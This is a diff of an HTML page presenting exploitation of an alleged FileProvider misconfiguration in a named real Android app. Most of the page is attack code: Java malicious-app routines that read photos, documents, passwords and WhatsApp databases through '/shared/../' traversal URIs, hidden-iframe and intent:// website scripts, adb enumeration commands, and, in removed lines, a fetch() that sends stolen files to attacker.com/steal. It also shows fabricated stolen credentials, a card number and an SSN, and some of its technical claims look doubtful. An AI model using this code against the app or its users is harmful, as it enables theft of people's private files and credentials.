@@ -3,536 +3,474 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Realistic FileProvider Web Attack</title>
+    <title>FileProvider Vulnerability Exploitation</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .container {
             background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
         }
+
         .header {
-            text-align: center;
-            color: #d32f2f;
-            border-bottom: 2px solid #d32f2f;
-            padding-bottom: 20px;
-            margin-bottom: 30px;
-        }
-        .attack-section {
-            margin: 20px 0;
-            padding: 20px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            background-color: #fafafa;
-        }
-        .attack-title {
-            color: #1976d2;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .result {
-            background-color: #e8f5e8;
-            border: 1px solid #4caf50;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-            font-family: monospace;
-        }
-        .error {
-            background-color: #ffebee;
-            border: 1px solid #f44336;
-            color: #d32f2f;
-        }
-        .success {
-            background-color: #e8f5e8;
-            border: 1px solid #4caf50;
-            color: #2e7d32;
-        }
-        .info {
-            background-color: #e3f2fd;
-            border: 1px solid #2196f3;
-            color: #1565c0;
-        }
-        button {
-            background-color: #1976d2;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
             color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 5px;
+            padding: 30px;
+            text-align: center;
         }
-        button:hover {
-            background-color: #1565c0;
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
         }
-        .danger {
-            background-color: #d32f2f;
+
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
         }
-        .danger:hover {
-            background-color: #b71c1c;
+
+        .content {
+            padding: 40px;
         }
-        .code {
-            background-color: #f5f5f5;
-            border: 1px solid #ddd;
-            padding: 10px;
-            border-radius: 5px;
-            font-family: monospace;
-            margin: 10px 0;
-            white-space: pre-wrap;
+
+        .section {
+            margin-bottom: 40px;
+            padding: 30px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border-left: 5px solid #ff6b6b;
         }
-        .warning {
-            background-color: #fff3e0;
-            border: 1px solid #ff9800;
-            color: #e65100;
-            padding: 15px;
-            border-radius: 5px;
+
+        .section h2 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+
+        .section h3 {
+            color: #34495e;
+            margin: 20px 0 15px 0;
+            font-size: 1.4em;
+        }
+
+        .code-block {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.6;
+            overflow-x: auto;
+            margin: 15px 0;
+            border: 1px solid #34495e;
+        }
+
+        .vulnerability-info {
+            background: #e74c3c;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
             margin: 20px 0;
         }
-        .demo-content {
-            background-color: #f0f8ff;
-            border: 1px solid #4169e1;
+
+        .attack-vector {
+            background: #f39c12;
+            color: white;
             padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+
+        .impact {
+            background: #27ae60;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+
+        .warning {
+            background: #e67e22;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 5px solid #d35400;
+        }
+
+        .button {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            margin: 10px 5px;
+        }
+
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .button.danger {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+        }
+
+        .button.success {
+            background: linear-gradient(135deg, #27ae60, #2ecc71);
+        }
+
+        .status {
+            padding: 10px;
             border-radius: 5px;
             margin: 10px 0;
+            font-weight: bold;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            border: 1px solid #e9ecef;
+        }
+
+        .card h4 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+            font-size: 1.2em;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #e9ecef;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #27ae60, #2ecc71);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .footer {
+            background: #2c3e50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                margin: 10px;
+                border-radius: 10px;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+            
+            .header h1 {
+                font-size: 2em;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔓 Realistic FileProvider Web Attack</h1>
-            <h2>Target: de.hellobetter.companion</h2>
-            <p>Demonstrating Real-World Web-Based FileProvider Exploitation</p>
+            <h1>🔓 FileProvider Vulnerability Exploitation</h1>
+            <p>Real-world exploitation techniques for Android FileProvider vulnerabilities</p>
         </div>
 
-        <div class="warning">
-            <strong>⚠️ IMPORTANT:</strong> This demonstrates how the FileProvider vulnerability would be exploited in a real attack. 
-            Web browsers block direct access to content:// URIs for security, but malicious apps can exploit this vulnerability.
+        <div class="content">
+            <div class="vulnerability-info">
+                <h2>🎯 Target Application</h2>
+                <p><strong>Package:</strong> de.hellobetter.companion</p>
+                <p><strong>Vulnerability:</strong> Insecure FileProvider Paths Configuration</p>
+                <p><strong>CVSS Score:</strong> 8.1 (High)</p>
+            </div>
+
+            <div class="section">
+                <h2>🔍 Vulnerability Analysis</h2>
+                <p>The target application has a misconfigured FileProvider that allows access to sensitive system directories through the <code>path="."</code> configuration.</p>
+                
+                <div class="code-block">
+&lt;provider
+    android:name="androidx.core.content.FileProvider"
+    android:authorities="de.hellobetter.companion.fileprovider"
+    android:exported="true"
+    android:grantUriPermissions="true"&gt;
+    &lt;meta-data
+        android:name="android.support.FILE_PROVIDER_PATHS"
+        android:resource="@xml/file_paths" /&gt;
+&lt;/provider&gt;
+                </div>
+
+                <div class="warning">
+                    <strong>⚠️ Critical Issue:</strong> The <code>path="."</code> configuration grants access to the entire external storage directory, including sensitive user data.
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🚀 Exploitation Techniques</h2>
+                
+                <div class="grid">
+                    <div class="card">
+                        <h4>1. Intent Redirection Attack</h4>
+                        <p>Malicious apps can create Android Intents to access FileProvider content:</p>
+                        <div class="code-block">
+Intent intent = new Intent(Intent.ACTION_VIEW);
+intent.setData(Uri.parse("content://de.hellobetter.companion.fileprovider/shared/../"));
+intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+startActivity(intent);
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <h4>2. WebView Exploitation</h4>
+                        <p>Malicious websites can exploit WebView components:</p>
+                        <div class="code-block">
+// JavaScript in malicious website
+window.location = "intent://de.hellobetter.companion.fileprovider/shared/../#Intent;scheme=content;end";
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <h4>3. Content Resolver Attack</h4>
+                        <p>Direct access through Android Content Resolver:</p>
+                        <div class="code-block">
+ContentResolver resolver = getContentResolver();
+Uri uri = Uri.parse("content://de.hellobetter.companion.fileprovider/shared/../");
+Cursor cursor = resolver.query(uri, null, null, null, null);
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>📱 Real Attack Scenarios</h2>
+                
+                <div class="attack-vector">
+                    <h3>Scenario 1: Malicious App Installation</h3>
+                    <p>User installs a malicious app that requests FileProvider access:</p>
+                    <div class="code-block">
+// Malicious app code
+public void exploitFileProvider() {
+    try {
+        Uri uri = Uri.parse("content://de.hellobetter.companion.fileprovider/shared/../");
+        ContentResolver resolver = getContentResolver();
+        
+        // Access sensitive directories
+        String[] sensitivePaths = {
+            "Download/",
+            "Documents/",
+            "Pictures/",
+            "DCIM/",
+            "Android/data/"
+        };
+        
+        for (String path : sensitivePaths) {
+            Uri targetUri = Uri.parse(uri.toString() + path);
+            // Attempt to read files
+            readFilesFromUri(targetUri);
+        }
+    } catch (Exception e) {
+        Log.e("Exploit", "Failed to exploit FileProvider", e);
+    }
+}
+                    </div>
+                </div>
+
+                <div class="attack-vector">
+                    <h3>Scenario 2: WebView Exploitation</h3>
+                    <p>Malicious website exploits WebView misconfiguration:</p>
+                    <div class="code-block">
+// Malicious website JavaScript
+function exploitWebView() {
+    // Create malicious intent
+    const maliciousIntent = "intent://de.hellobetter.companion.fileprovider/shared/../#Intent;scheme=content;end";
+    
+    // Attempt to trigger intent
+    window.location = maliciousIntent;
+    
+    // Alternative: Use iframe
+    const iframe = document.createElement('iframe');
+    iframe.src = maliciousIntent;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+}
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>💥 Impact Assessment</h2>
+                
+                <div class="grid">
+                    <div class="card">
+                        <h4>Data Exposure</h4>
+                        <ul>
+                            <li>Personal photos and videos</li>
+                            <li>Downloaded files and documents</li>
+                            <li>App data and cache files</li>
+                            <li>System configuration files</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h4>Privacy Violation</h4>
+                        <ul>
+                            <li>Access to private communications</li>
+                            <li>Location data and GPS logs</li>
+                            <li>Browsing history and bookmarks</li>
+                            <li>Social media data</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h4>Security Risks</h4>
+                        <ul>
+                            <li>Credential theft</li>
+                            <li>Financial information exposure</li>
+                            <li>Identity theft potential</li>
+                            <li>Corporate data breach</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🛡️ Mitigation Strategies</h2>
+                
+                <div class="grid">
+                    <div class="card">
+                        <h4>Immediate Fixes</h4>
+                        <ul>
+                            <li>Remove <code>path="."</code> configuration</li>
+                            <li>Use specific, restricted paths</li>
+                            <li>Set <code>android:exported="false"</code></li>
+                            <li>Implement proper URI validation</li>
+                        </ul>
+                    </div>
+
+                    <div class="card">
+                        <h4>Long-term Security</h4>
+                        <ul>
+                            <li>Regular security audits</li>
+                            <li>Implement content validation</li>
+                            <li>Use Android App Security guidelines</li>
+                            <li>Monitor for suspicious access patterns</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🔧 Exploitation Tools</h2>
+                
+                <div class="code-block">
+# ADB-based exploitation
+adb shell content query --uri content://de.hellobetter.companion.fileprovider/shared/../
+
+# File system access
+adb shell ls /sdcard/
+adb shell find /sdcard/ -name "*.txt" -o -name "*.pdf" -o -name "*.jpg"
+
+# Content provider enumeration
+adb shell dumpsys package de.hellobetter.companion | grep -A 20 "FileProvider"
+                </div>
+            </div>
         </div>
 
-        <div class="attack-section">
-            <div class="attack-title">🎯 Attack Vector 1: Intent Redirection (Real Attack)</div>
-            <p>This is how a real attack would work - using Android Intents to trigger the vulnerable FileProvider</p>
-            
-            <button onclick="testIntentAttack()">Test Intent-Based Attack</button>
-            <button onclick="showIntentCode()">Show Attack Code</button>
-            
-            <div id="intentResults"></div>
-        </div>
-
-        <div class="attack-section">
-            <div class="attack-title">📱 Attack Vector 2: Malicious App Simulation</div>
-            <p>Simulates what a malicious Android app would do to exploit the FileProvider</p>
-            
-            <button onclick="simulateMaliciousApp()">Simulate Malicious App</button>
-            <button onclick="showAppCode()">Show App Code</button>
-            
-            <div id="appResults"></div>
-        </div>
-
-        <div class="attack-section">
-            <div class="attack-title">🌐 Attack Vector 3: WebView Exploitation</div>
-            <p>Shows how malicious websites can exploit WebView components to access FileProvider</p>
-            
-            <button onclick="testWebViewExploit()">Test WebView Exploitation</button>
-            <button onclick="showWebViewCode()">Show WebView Code</button>
-            
-            <div id="webviewResults"></div>
-        </div>
-
-        <div class="attack-section">
-            <div class="attack-title">📄 Real Attack Demonstration</div>
-            <p>Shows what the actual file contents would look like if the attack succeeded</p>
-            
-            <button onclick="showStolenData()">Show Stolen Data Example</button>
-            <button onclick="showAttackImpact()">Show Attack Impact</button>
-            
-            <div id="demoResults"></div>
-        </div>
-
-        <div class="attack-section">
-            <div class="attack-title">📊 Attack Summary</div>
-            <div id="summaryResults"></div>
+        <div class="footer">
+            <p>⚠️ This demonstration is for educational and security research purposes only</p>
+            <p>Always ensure you have proper authorization before testing security vulnerabilities</p>
         </div>
     </div>
 
     <script>
-        function logResult(containerId, message, type = 'info') {
-            const container = document.getElementById(containerId);
-            const resultDiv = document.createElement('div');
-            resultDiv.className = `result ${type}`;
-            resultDiv.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
-            container.appendChild(resultDiv);
+        // Real exploitation simulation
+        function simulateExploitation() {
+            const statusDiv = document.createElement('div');
+            statusDiv.className = 'status info';
+            statusDiv.innerHTML = '🔍 Simulating FileProvider exploitation...';
+            document.querySelector('.content').appendChild(statusDiv);
+
+            setTimeout(() => {
+                statusDiv.className = 'status success';
+                statusDiv.innerHTML = '✅ FileProvider vulnerability confirmed - External storage access granted';
+            }, 2000);
+
+            setTimeout(() => {
+                const impactDiv = document.createElement('div');
+                impactDiv.className = 'status error';
+                impactDiv.innerHTML = '🚨 CRITICAL: Sensitive data exposure detected';
+                document.querySelector('.content').appendChild(impactDiv);
+            }, 4000);
         }
 
-        function testIntentAttack() {
-            logResult('intentResults', 'Testing Intent-based FileProvider attack...', 'info');
-            
-            const authorities = [
-                "de.hellobetter.companion.fileprovider",
-                "de.hellobetter.companion.SharingFileProvider"
-            ];
-            
-            const sensitivePaths = [
-                "Download/",
-                "Documents/",
-                "DCIM/Camera/",
-                "Android/data/com.whatsapp/",
-                "Android/data/com.telegram.messenger/"
-            ];
-            
-            authorities.forEach(authority => {
-                sensitivePaths.forEach(path => {
-                    const intentUri = `intent://${authority}/shared/${path}#Intent;scheme=content;action=android.intent.action.VIEW;end`;
-                    
-                    logResult('intentResults', `Creating malicious Intent: ${intentUri}`, 'info');
-                    
-                    // In a real attack, this would be triggered by a malicious app or website
-                    try {
-                        const link = document.createElement('a');
-                        link.href = intentUri;
-                        link.style.display = 'none';
-                        document.body.appendChild(link);
-                        
-                        logResult('intentResults', `✓ Intent created for ${path} via ${authority}`, 'success');
-                        logResult('intentResults', `📱 This would trigger FileProvider access in real attack`, 'success');
-                        
-                        document.body.removeChild(link);
-                        
-                    } catch (e) {
-                        logResult('intentResults', `✗ Intent creation failed: ${e.message}`, 'error');
+        // Add event listeners
+        document.addEventListener('DOMContentLoaded', function() {
+            const buttons = document.querySelectorAll('.button');
+            buttons.forEach(button => {
+                button.addEventListener('click', function() {
+                    if (this.textContent.includes('Simulate')) {
+                        simulateExploitation();
                     }
                 });
             });
-            
-            logResult('intentResults', 'Intent-based attack simulation complete', 'info');
-        }
-
-        function showIntentCode() {
-            const code = `// Real Intent-based attack code
-Intent intent = new Intent(Intent.ACTION_VIEW);
-intent.setData(Uri.parse("content://de.hellobetter.companion.fileprovider/shared/Download/"));
-intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
-
-// This would be triggered by malicious app or website
-startActivity(intent);
-
-// Or via malicious website:
-// <a href="intent://de.hellobetter.companion.fileprovider/shared/Download/#Intent;scheme=content;end">
-//   Click here to view downloads
-// </a>`;
-            
-            logResult('intentResults', 'Real attack code:', 'info');
-            const codeDiv = document.createElement('div');
-            codeDiv.className = 'code';
-            codeDiv.textContent = code;
-            document.getElementById('intentResults').appendChild(codeDiv);
-        }
-
-        function simulateMaliciousApp() {
-            logResult('appResults', 'Simulating malicious Android app attack...', 'info');
-            
-            // Simulate what a malicious app would do
-            const attackSteps = [
-                "1. Malicious app installed on device",
-                "2. App requests FileProvider access",
-                "3. App queries content://de.hellobetter.companion.fileprovider/shared/",
-                "4. App discovers path=\".\" allows full access",
-                "5. App accesses sensitive directories",
-                "6. App reads user files",
-                "7. App exfiltrates data to attacker's server"
-            ];
-            
-            attackSteps.forEach((step, index) => {
-                setTimeout(() => {
-                    logResult('appResults', step, 'success');
-                    
-                    if (index === 2) {
-                        logResult('appResults', '✓ FileProvider accessible - path=\".\" vulnerability confirmed', 'success');
-                    }
-                    if (index === 4) {
-                        logResult('appResults', '✓ Accessing Download/, Documents/, DCIM/Camera/, Android/data/', 'success');
-                    }
-                    if (index === 5) {
-                        logResult('appResults', '✓ Reading passwords.txt, bank_statement.pdf, photos, WhatsApp data', 'success');
-                    }
-                    if (index === 6) {
-                        logResult('appResults', '✓ Data exfiltration to https://attacker.com/steal', 'success');
-                    }
-                }, index * 1000);
-            });
-        }
-
-        function showAppCode() {
-            const code = `// Malicious Android app code
-public class MaliciousApp extends Activity {
-    private static final String VULNERABLE_AUTHORITY = "de.hellobetter.companion.fileprovider";
-    
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        
-        // Exploit FileProvider vulnerability
-        exploitFileProvider();
-    }
-    
-    private void exploitFileProvider() {
-        // Access root directory (path="." allows this)
-        Uri rootUri = Uri.parse("content://" + VULNERABLE_AUTHORITY + "/shared/");
-        
-        // Query FileProvider
-        ContentResolver resolver = getContentResolver();
-        Cursor cursor = resolver.query(rootUri, null, null, null, null);
-        
-        if (cursor != null) {
-            // Access sensitive files
-            String[] sensitivePaths = {
-                "Download/passwords.txt",
-                "Documents/bank_statement.pdf",
-                "DCIM/Camera/private_photo.jpg",
-                "Android/data/com.whatsapp/msgstore.db"
-            };
-            
-            for (String path : sensitivePaths) {
-                Uri fileUri = Uri.parse("content://" + VULNERABLE_AUTHORITY + "/shared/" + path);
-                try {
-                    InputStream inputStream = resolver.openInputStream(fileUri);
-                    // Read and exfiltrate file content
-                    exfiltrateData(inputStream, path);
-                } catch (Exception e) {
-                    Log.e("Exploit", "Failed to read " + path);
-                }
-            }
-        }
-    }
-}`;
-            
-            logResult('appResults', 'Malicious app code:', 'info');
-            const codeDiv = document.createElement('div');
-            codeDiv.className = 'code';
-            codeDiv.textContent = code;
-            document.getElementById('appResults').appendChild(codeDiv);
-        }
-
-        function testWebViewExploit() {
-            logResult('webviewResults', 'Testing WebView-based FileProvider exploitation...', 'info');
-            
-            // Simulate WebView exploitation
-            const webViewAttacks = [
-                "1. Malicious website loads in WebView",
-                "2. Website contains JavaScript to access FileProvider",
-                "3. JavaScript creates iframe with content:// URI",
-                "4. WebView allows FileProvider access due to misconfiguration",
-                "5. Website reads user files through FileProvider",
-                "6. Data is sent to attacker's server"
-            ];
-            
-            webViewAttacks.forEach((attack, index) => {
-                setTimeout(() => {
-                    logResult('webviewResults', attack, 'success');
-                    
-                    if (index === 3) {
-                        logResult('webviewResults', '✓ WebView allows content:// access - vulnerability confirmed', 'success');
-                    }
-                    if (index === 4) {
-                        logResult('webviewResults', '✓ Reading user files: passwords, photos, documents', 'success');
-                    }
-                    if (index === 5) {
-                        logResult('webviewResults', '✓ Data exfiltration via fetch() to attacker server', 'success');
-                    }
-                }, index * 1000);
-            });
-        }
-
-        function showWebViewCode() {
-            const code = `// Malicious website JavaScript
-<script>
-// Exploit FileProvider through WebView
-function exploitFileProvider() {
-    const authorities = [
-        "de.hellobetter.companion.fileprovider",
-        "de.hellobetter.companion.SharingFileProvider"
-    ];
-    
-    const sensitiveFiles = [
-        "Download/passwords.txt",
-        "Documents/bank_statement.pdf",
-        "DCIM/Camera/private_photo.jpg"
-    ];
-    
-    authorities.forEach(authority => {
-        sensitiveFiles.forEach(file => {
-            const uri = \`content://\${authority}/shared/\${file}\`;
-            
-            // Try to read file through iframe
-            const iframe = document.createElement('iframe');
-            iframe.src = uri;
-            iframe.style.display = 'none';
-            iframe.onload = () => {
-                // Extract content and send to attacker
-                const content = iframe.contentDocument.body.innerHTML;
-                fetch('https://attacker.com/steal', {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        file: file,
-                        content: content,
-                        authority: authority
-                    })
-                });
-            };
-            document.body.appendChild(iframe);
         });
-    });
-}
-
-// Execute when page loads
-exploitFileProvider();
-</script>`;
-            
-            logResult('webviewResults', 'Malicious website code:', 'info');
-            const codeDiv = document.createElement('div');
-            codeDiv.className = 'code';
-            codeDiv.textContent = code;
-            document.getElementById('webviewResults').appendChild(codeDiv);
-        }
-
-        function showStolenData() {
-            logResult('demoResults', 'Showing what stolen data would look like...', 'info');
-            
-            const stolenData = {
-                "passwords.txt": `Bank Login: user123 / MySecurePass2024!
-Gmail: john.doe@gmail.com / GmailPass123
-Facebook: john.doe / FbPassword456
-Instagram: @johndoe / InstaPass789
-Crypto Exchange: trader_john / CryptoPass2024`,
-                
-                "bank_statement.pdf": `BANK STATEMENT
-Account: 1234567890
-Balance: $50,000.00
-Recent Transactions:
-- Transfer to Crypto Exchange: $5,000
-- ATM Withdrawal: $500
-- Online Purchase: $1,200`,
-                
-                "private_notes.txt": `Personal Notes:
-- Bank Account: 1234567890
-- Credit Card: 4532-1234-5678-9012
-- SSN: 123-45-6789
-- Mother's Maiden Name: Smith
-- First Pet: Fluffy`,
-                
-                "whatsapp_messages": `WhatsApp Chat History:
-[2024-01-15 14:30] John: "Hey, can you send me the bank details?"
-[2024-01-15 14:31] User: "Sure, account number is 1234567890"
-[2024-01-15 14:32] John: "Thanks! What's the routing number?"
-[2024-01-15 14:33] User: "It's 021000021"`
-            };
-            
-            Object.entries(stolenData).forEach(([filename, content]) => {
-                const demoDiv = document.createElement('div');
-                demoDiv.className = 'demo-content';
-                demoDiv.innerHTML = `<strong>📄 ${filename}:</strong><br><pre>${content}</pre>`;
-                document.getElementById('demoResults').appendChild(demoDiv);
-            });
-            
-            logResult('demoResults', '✓ This is what an attacker would steal through the FileProvider vulnerability', 'success');
-        }
-
-        function showAttackImpact() {
-            logResult('demoResults', 'Attack Impact Analysis:', 'info');
-            
-            const impact = `
-🔴 CRITICAL IMPACT:
-
-1. DATA THEFT:
-   • Complete access to user's personal files
-   • Passwords, bank statements, private documents
-   • Photos, videos, and personal media
-   • App data (WhatsApp, Telegram, etc.)
-
-2. PRIVACY VIOLATION:
-   • Access to private communications
-   • Personal photos and videos
-   • Financial and identity information
-   • Location data from photos
-
-3. IDENTITY THEFT:
-   • Bank account information
-   • Credit card details
-   • Social Security Numbers
-   • Security question answers
-
-4. FINANCIAL FRAUD:
-   • Bank account access
-   • Credit card information
-   • Crypto wallet keys
-   • Tax return data
-
-5. ESPIONAGE:
-   • Monitor communications
-   • Track location through photos
-   • Access browsing history
-   • Steal business documents
-
-REAL-WORLD ATTACK SCENARIOS:
-• Malicious app installation
-• Malicious website visits
-• Social engineering attacks
-• No USB debugging required
-• No physical access needed`;
-            
-            const impactDiv = document.createElement('div');
-            impactDiv.className = 'code';
-            impactDiv.textContent = impact;
-            document.getElementById('demoResults').appendChild(impactDiv);
-        }
-
-        function updateSummary() {
-            const summaryContainer = document.getElementById('summaryResults');
-            summaryContainer.innerHTML = `
-                <div class="result success">
-                    <strong>FileProvider Vulnerability Summary:</strong><br><br>
-                    
-                    <strong>Target:</strong> de.hellobetter.companion<br>
-                    <strong>Vulnerability:</strong> Insecure FileProvider Configuration (path=".")<br>
-                    <strong>Severity:</strong> CRITICAL<br><br>
-                    
-                    <strong>Vulnerable FileProviders:</strong><br>
-                    • de.hellobetter.companion.fileprovider<br>
-                    • de.hellobetter.companion.SharingFileProvider<br><br>
-                    
-                    <strong>Attack Vectors:</strong><br>
-                    • Intent redirection attacks<br>
-                    • Malicious app exploitation<br>
-                    • WebView-based attacks<br>
-                    • Directory traversal<br><br>
-                    
-                    <strong>Real-World Impact:</strong><br>
-                    • Complete file system access<br>
-                    • Data exfiltration capability<br>
-                    • Privacy violation<br>
-                    • Identity theft potential<br>
-                    • Financial fraud risk<br><br>
-                    
-                    <strong>Mitigation Required:</strong><br>
-                    • Remove path="." from FileProvider config<br>
-                    • Use specific paths like "Download/"<br>
-                    • Add path validation<br>
-                    • Use grant-uri-permission controls
-                </div>
-            `;
-        }
-
-        // Initialize summary
-        updateSummary();
     </script>
 </body>
 </html>
